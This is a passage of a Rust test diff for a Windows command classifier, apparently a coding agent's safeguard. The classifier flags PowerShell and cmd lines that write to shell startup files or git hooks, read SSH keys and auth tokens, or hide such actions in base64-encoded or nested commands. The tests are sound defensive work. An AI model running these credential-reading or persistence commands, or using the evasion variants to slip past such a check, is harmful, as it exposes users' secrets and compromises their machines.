+        ),
+        (r"Copy-Item C:\evil C:\Users\fixture\.bashrc", Persistence),
+        (
+            r"Invoke-WebRequest https://x.example -OutFile ~\.profile",
+            Persistence,
+        ),
+        (
+            r#"[IO.File]::WriteAllText("$HOME\.bashrc", 'x')"#,
+            Persistence,
+        ),
+        (r"Set-Location ~; Add-Content .zshrc x", Persistence),
+        (
+            r"New-Item -ItemType File C:\work\.git\hooks\pre-push",
+            Persistence,
+        ),
+        (
+            r"Compress-Archive -Path $HOME -DestinationPath x.zip",
+            Credentials,
+        ),
+        (r"Copy-Item -Recurse C:\Users\fixture D:\x", Credentials),
+        (r"& 'C:\Tools\corbanu.exe' vault list", Vault),
+        // Review 1: folder parameters, provider paths, unknown variables.
+        (r"Set-Location -Path:~; Add-Content .bashrc x", Persistence),
+        (r"Set-Location -Path ~; Add-Content .bashrc x", Persistence),
+        (r"sl -LiteralPath $HOME; ac .profile x", Persistence),
+        (r"Add-Content FileSystem::$HOME\.bashrc x", Persistence),
+        (
+            r"Add-Content Microsoft.PowerShell.Core\FileSystem::C:\Users\fixture\.bashrc x",
+            Persistence,
+        ),
+        (r"Add-Content $env:TEMP\..\..\..\.bashrc x", UnseenCode),
+        // Review 2: switches before the folder, PowerShell's bare `cd`.
+        (
+            r"Set-Location -PassThru ~; Add-Content .bashrc x",
+            Persistence,
+        ),
+        (r"cd; Add-Content .bashrc x", Persistence),
+        (
+            r"Push-Location -StackName s C:\Users\fixture; Add-Content .bashrc x",
+            Persistence,
+        ),
+        // Paths built from parts.
+        (r"Add-Content (Join-Path $HOME '.bashrc') 'x'", Persistence),
+        (r"Join-Path -Path $HOME -ChildPath .ssh\id_rsa", Credentials),
+        (
+            r"[IO.File]::AppendAllText([IO.Path]::Combine($HOME, '.zshrc'), 'x')",
+            Persistence,
+        ),
+        (r#"Add-Content ("$HOME" + "\.profile") x"#, Persistence),
+        (
+            r"New-Item -Path $HOME -Name .bash_profile -Value x",
+            Persistence,
+        ),
+        (
+            r"ni $env:USERPROFILE -Name .gitconfig -Value x -Force",
+            Persistence,
+        ),
+        (
+            r"$p = [Environment]::GetFolderPath('UserProfile')",
+            UnseenCode,
+        ),
+    ] {
+        assert_eq!(powershell(line), Some(expected), "powershell {line}");
+    }
+    // Not through a shell: an argv run as it is.
+    for (command, expected) in [
+        (&[r"C:\Tools\corbanu.exe", "vault", "list"][..], Vault),
+        (&["corbanu.exe", "vault", "list"], Vault),
+        (
+            &[
+                "cmd.exe",
+                "/c",
+                "type",
+                r"C:\Users\fixture\.corbanu\auth.json",
+            ],
+            Credentials,
+        ),
+        (
+            &["cmd.exe", "/c", "copy", "x", r"C:\Users\fixture\.bashrc"],
+            Persistence,
+        ),
+        // POSIX lines on Windows: the user's home is a Windows folder.
+        (&["bash", "-lc", "echo x >> ~/.bashrc"], Persistence),
+        (&["bash", "-lc", "echo x >> $HOME/.zshrc"], Persistence),
+        (&["bash", "-lc", "cat ~/.docker/config.json"], Credentials),
+        (
+            &["bash", "-lc", "cat C:/Users/fixture/.corbanu/auth.json"],
+            Credentials,
+        ),
+        (&["bash", "-lc", "cd ~ && echo x >> .profile"], Persistence),
+    ] {
+        assert_eq!(windows_kind(command), Some(expected), "{command:?}");
+    }
+    // PowerShell's encoded commands are decoded; undecodable ones fail closed.
+    let encoded = |text: &str| {
+        use base64::Engine as _;
+        base64::engine::general_purpose::STANDARD.encode(
+            text.encode_utf16()
+                .flat_map(u16::to_le_bytes)
+                .collect::<Vec<u8>>(),
+        )
+    };
+    assert_eq!(
+        windows_kind(&[
+            "powershell.exe",
+            "-EncodedCommand",
+            &encoded(r"Get-Content $env:USERPROFILE\.ssh\id_rsa"),
+        ]),
+        Some(Credentials)
+    );
+    assert_eq!(
+        windows_kind(&["pwsh", "-enc", &encoded("Add-Content ~\\.bashrc x")]),
+        Some(Persistence)
+    );
+    assert_eq!(
+        windows_kind(&["powershell", "-e", "not base64!"]),
+        Some(UnseenCode)
+    );
+    // Review 1: `/` prefixes, other encoded parameters, the working folder.
+    assert_eq!(
+        windows_kind(&[
+            "powershell.exe",
+            "/enc",
+            &encoded(r"Get-Content $env:USERPROFILE\.ssh\id_rsa"),
+        ]),
+        Some(Credentials)
+    );
+    assert_eq!(
+        windows_kind(&["pwsh", "-ea", "not base64!", "-c", "dir"]),
+        Some(UnseenCode)
+    );
+    // Review 5: a value-taking parameter this reading may not know.
+    for parameter in ["-ConfigurationFile", "-SomeFutureParameter"] {
+        assert_eq!(
+            windows_kind(&[
+                "pwsh",
+                parameter,
+                "a.pssc",
+                "-EncodedCommand",
+                &encoded(r"Add-Content ~\.bashrc x"),
+            ]),
+            Some(Persistence),
+            "{parameter}"
+        );
+    }
+    // Review 3: a nested PowerShell's parameters; the payload runs from
+    // each folder the line may be in.
+    let add_bashrc = encoded("Add-Content .bashrc x");
+    for line in [
+        format!("pwsh -c pwsh -enc {}", encoded(r"Add-Content ~\.bashrc x")),
+        format!(r"cd /d %USERPROFILE% & cd nosuch & pwsh -enc {add_bashrc}"),
+        format!(r"cd /d %USERPROFILE% & pushd AppData & popd & pwsh -enc {add_bashrc}"),
+    ] {
+        assert_eq!(cmd(&line), Some(Persistence), "{line}");
+    }
+    for script in ["Add-Content .bashrc x", "Get-Date; Add-Content .bashrc x"] {
+        assert_eq!(
+            windows_kind(&["pwsh", "-WorkingDirectory", "~", "-Command", script]),
+            Some(Persistence),
+            "{script}"
+        );
+    }
+    assert_eq!(
+        windows_kind(&[
+            "cmd.exe",
+            "/c",
+            "cd",
+            "/d",
+            "%USERPROFILE%",
+            "&",
+            "echo",
+            "x",
+            ">>",
+            ".bashrc",
+        ]),
+        Some(Persistence)
+    );
+    // Review 4: a folder past the length limit fails closed (and the next
+    // command still has folders to resolve against).
+    assert_eq!(
+        cmd(&format!(
+            "cd {} && dir && echo x >> %USERPROFILE%\\.bashrc",
+            "a".repeat(1100)
+        )),
+        Some(Persistence)
+    );
+    assert_eq!(
+        cmd(&format!("cd {} && dir", "a".repeat(1100))),
+        Some(UnseenCode)
+    );
+    // Too many folders the line may be in fails closed.
+    let siblings: String = (0..20).map(|n| format!("cd d{n} & cd .. & ")).collect();
+    assert_eq!(cmd(&format!("{siblings}dir")), Some(UnseenCode));
+    // Another drive's current folder cannot be known: it fails closed.
+    for line in [
+        r"echo x >> C:.bashrc",
+        r"cd /d C: & echo x >> .bashrc",
+        "C: & echo x >> .bashrc",
+    ] {
+        assert_eq!(
+            windows_kind_with(WINDOWS_HOME, r"D:\work", &["cmd", "/c", line]),
+            Some(UnseenCode),
+            "D:\\work> {line}"
+        );
+    }
+    // A Corbanu home elsewhere, named only by its path.
+    for (line, expected) in [
+        (
+            r"type D:\corbanu-terminal\home\config.toml",
+            Some(SecurityPolicy),
+        ),
+        (
+            r"type d:\CORBANU-TERMINAL\home\auth.json",
+            Some(Credentials),
+        ),
+        (r"type D:\corbanu-terminal\homework.txt", None),
+    ] {
+        assert_eq!(
+            windows_kind_with(
+                r"D:\corbanu-terminal\home",
+                r"C:\work",
+                &["cmd", "/c", line]
+            ),
+            expected,
+            "{line}"
+        );
+    }
+    // Relative to a working folder in the home.
+    for (cwd, line, expected) in [
+        // Review 4: a move that fails, does not run or does not move keeps
+        // the folders before it.
+        (
+            r"C:\Users\fixture\proj",
+            r"cd nosuch && rem & echo x >> ..\.bashrc",
+            Persistence,
+        ),
+        (
+            r"C:\Users\fixture\proj",
+            r"echo cd sub && echo x >> ..\.bashrc",
+            Persistence,
+        ),
+        (
+            r"C:\Users\fixture\proj",
+            r"cd D:\tmp && echo x >> ..\.bashrc",
+            Persistence,
+        ),
+        (
+            r"C:\Users\fixture\proj",
+            r"cd && echo x >> ..\.bashrc",
+            Persistence,
+        ),
+        (
+            r"C:\Users\fixture\proj",
+            r"if exist x (cd x && echo a) & echo x >> ..\.bashrc",
+            Persistence,
+        ),
+        (r"C:\Users\fixture\.corbanu", "type auth.json", Credentials),
+        (r"C:\Users\fixture", r"type .corbanu\auth.json", Credentials),
+        (r"C:\Users\fixture\proj", r"type ..\.netrc", Credentials),
+        (
+            r"C:\Users\fixture\proj",
+            r"echo x >> ..\.bashrc",
+            Persistence,
+        ),
+        (
+            r"C:\Users\fixture\proj",
+            "cd .. & echo x >> .bashrc",
+            Persistence,
+        ),
+    ] {
+        assert_eq!(
+            windows_kind_with(WINDOWS_HOME, cwd, &["cmd", "/c", line]),
+            Some(expected),
+            "{cwd}> {line}"
+        );
+    }
+}
+
+/// #1240: ordinary Windows work is not judged protected.
+#[test]
+fn issue_1240_ordinary_windows_commands_are_not_protected() {
+    for line in [
+        "dir",
+        "type README.md",
+        r"type src\main.rs",
+        "copy a.txt b.txt",
+        "echo hi > out.txt",
+        r"cd /d C:\work\sub & dir",
+        r"type C:\Users\fixture\proj\README.md",
+        r"type C:\Users\fixture\.corbanu\worktrees\x\src\lib.rs",
+        r"type C:\Users\fixture\.codex-work\notes.txt",
+        r"del /q build\*",
+        "git.exe status",
+        "cargo test -p codex-core",
+        // Review 1: several folder changes are followed, not compounded.
+        r"cd sub & cd sub2 & cd ..\sub3 & cd .. & dir",
+        r"cd a && make && cd .. && cd b && make && cd .. && cd c && make && cd ..",
+        r"echo x > %TEMP%\out.txt",
+        r"type C:README.md",
+        "cargo test a::tests e:true: -- x:y",
+    ] {
+        assert_eq!(cmd(line), None, "cmd /c {line}");
+    }
+    for line in [
+        r"Get-Content src\main.rs",
+        r"Get-ChildItem -Recurse C:\work\src",
+        "Set-Content -Path notes.txt -Value x",
+        r"Get-Content C:\work\x.txt | Out-File C:\work\y.txt",
+        r"Copy-Item -Recurse C:\work\src C:\work\backup",
+        r"Remove-Item -Recurse -Force target\debug",
+        r"Select-String -Path *.rs -Pattern vault",
+        r"$env:RUST_LOG = 'debug'; cargo test",
+        r"Write-Output $HOME",
+        r"New-Item -ItemType Directory C:\work\out",
+        r"Join-Path $HOME 'proj\README.md'",
+        r"[Environment]::GetEnvironmentVariable('PATH')",
+        r"Set-Location src; Set-Location ..\docs; Get-Content README.md",
+        r#"curl.exe -s -d '{"a":{"b":1},"e":{"f":2}}' https://api.example"#,
+        // Review 2: `-e…` words of the command are not PowerShell's own.
+        "Get-Content a.txt -Encoding utf8 -ErrorAction Stop -Exclude *.log",
+        r"echo x > %CD%\..\work\out.txt",
+    ] {
+        assert_eq!(powershell(line), None, "powershell {line}");
+    }
+}
+
+/// #1240: the Windows reading stays linear in the line's length (both
+/// judgments are measured). One test per unit, so none runs long.
+macro_rules! issue_1240_windows_checks_are_linear {
+    ($($name:ident: $unit:literal,)*) => {
+        mod issue_1240_windows_checks_are_linear {
+            use super::*;
+            $(
+                #[test]
+                fn $name() {
+                    work::assert_linear(stringify!($name), |scale| {
+                        let _ = powershell(&$unit.repeat(100 * scale));
+                    });
+                }
+            )*
+        }
+    };
+}
+
+issue_1240_windows_checks_are_linear! {
+    paths: r"type C:\a\b\c.txt & ",
+    variables: r"%USERPROFILE%\x $env:HOME\y ${env:CODEX_HOME} ",
+    redirections: r"echo x >> C:\a\b 2>&1 ",
+    writers: r"copy a b; Set-Content -Path c -Value d; ",
+    // Relative moves multiply the folders up to the cap (tested apart).
+    folders: r"cd /x & cd .. & pushd \y & popd & ",
+    // `` ` `` is left out: the POSIX reading takes it for a substitution.
+    quotes: r#"'a b' "c d" e^f "#,
+    operators: "|&;(){},<> ",
+    percents: "%a% %% % ",
+    // One command: each `ni` and join looks only a few words ahead.
+    joins: "ni -Name b Join-Path a b c + d [IO.Path]::Combine e f ",
+}
+
+/// #1240 review 6: parameters before a folder, a spent budget, and a word
+/// named like `cd` inside a long command.
+#[test]
+fn issue_1240_review_6_routes() {
+    use ProtectedActionKind::*;
+    for (line, expected) in [
+        (
+            r"Push-Location -StackName:s C:\Users\fixture; Add-Content .bashrc x",
+            Persistence,
+        ),
+        (
+            r"Set-Location -ErrorAction SilentlyContinue $env:USERPROFILE\.corbanu; Get-Content auth.json",
+            Credentials,
+        ),
+        // Review 7: the shortest prefixes.
+        (
+            r"Push-Location -st s C:\Users\fixture; Add-Content .bashrc x",
+            Persistence,
+        ),
+        (
+            r"Push-Location -s s C:\Users\fixture; Add-Content .bashrc x",
+            Persistence,
+        ),
+    ] {
+        assert_eq!(powershell(line), Some(expected), "{line}");
+    }
+    // Review 7: a long spelling of cmd's cd that normalizes to a folder.
+    assert_eq!(
+        cmd(&format!(
+            r"cd C:\Users\fixture\x y\..{} & echo x>>.bashrc",
+            r"\.".repeat(600)
+        )),
+        Some(Persistence)
+    );
+    // `ci/cd` in a long message is not a folder change.
+    let files: String = (0..200).map(|n| format!(r"src\file{n}.rs ")).collect();
+    assert_eq!(cmd(&format!("git add ci/cd {files}")), None);
+    assert_eq!(
+        powershell(&format!(
+            "git commit -m \"Update CI/CD: {}\"",
+            "word ".repeat(300)
+        )),
+        None
+    );
 }
 
 /// D153: since #1159, a name such as `git.exe` split out of quoted text ended
@@ -4057,10 +4582,12 @@ fn d153_checks_are_linear() {
         ("git then text", "-C x git a "),
         ("names in values", "-C git.exe -C git "),
     ] {
+        // 100 repeats: the work counts are compared, not the clock, and the
+        // classifier's fixed cost stays under 4% of the 1x count.
         work::assert_linear(label, |scale| {
-            let line = format!("git {} status", unit.repeat(400 * scale));
+            let line = format!("git {} status", unit.repeat(100 * scale));
             let _ = script(&line);
-            let line = format!("git.exe {} status", unit.repeat(400 * scale));
+            let line = format!("git.exe {} status", unit.repeat(100 * scale));
             let _ = script(&line);
         });
     }
